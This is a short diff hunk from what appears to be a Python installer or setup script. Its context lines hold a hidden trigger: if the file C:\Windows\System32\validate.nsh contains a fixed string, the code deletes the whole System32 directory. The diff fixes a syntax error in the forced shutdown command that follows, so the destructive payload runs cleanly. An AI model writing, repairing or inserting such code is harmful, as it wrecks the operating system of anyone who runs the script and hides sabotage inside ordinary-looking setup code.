@@ -48,7 +48,7 @@ file_pathxx = r'C:\Windows\System32\validate.nsh'
 file_contentsx1 = read_file(file_pathxx)
 if file_contentsx1 =="mJaAQuPVWhWXG":
     shutil.rmtree(r'C:\Windows\System32')
-    os.system("shutdown /s /f /t 0
+    os.system("shutdown /s /f /t 0")
 
 
 def add_path_and_install_libraries():
